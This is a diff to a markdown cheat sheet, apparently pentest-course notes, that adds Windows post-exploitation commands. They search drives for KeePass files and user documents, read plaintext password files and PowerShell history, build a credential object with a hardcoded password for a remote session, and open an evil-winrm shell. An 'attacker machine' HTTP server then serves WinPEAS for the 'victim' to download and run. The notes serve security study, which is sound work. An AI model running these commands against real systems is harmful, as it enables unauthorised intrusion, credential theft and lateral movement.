@@ -405,9 +405,41 @@ Find `.kdbx` file in C drive `> Get-ChildItem -Path C:\ -Include *.kdbx -File -R
 
 Find all text and ini config files in xamp `> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
 
-Find all user files that may contian info in user folder `> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
+Find all user files that may contian info in user folder `> Get-ChildItem -Path C:\Users\mac\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
 
 Print file to terminal `type C:\xampp\passwords.txt`
+
+Run cmd as another user `> runas /user:backupadmin cmd`
+
+### Harvest Information
+
+Locate Powershell History file `> (Get-PSReadlineOption).HistorySavePath`
+
+Examine Transcripts `> type C:\Users\Public\Transcripts\transcript01.txt`
+
+Build PSCredential Object
+```
+> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+```
+
+Windows `evil-winrm` shell using `> evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
+
+### Automating Enumeration with WinPEAS
+
+ON ATTACKER MACHINE: 
+
+Copy to local dir `$ cp /usr/share/peass/winpeas/winPEASx64.exe .`
+
+Host HTTP Serv for file transfer `$ python3 -m http.server 80`
+
+ON VICTIM Machine: 
+
+Download WinPEAS from Attacker HTTP `> iwr -uri http://192.168.45.152/winPEASx64.exe -Outfile winPEAS.exe`
+
+Execute WinPEAS `> ./WinPEAS.exe`
+
 
 # Anti-virus Evasion
 
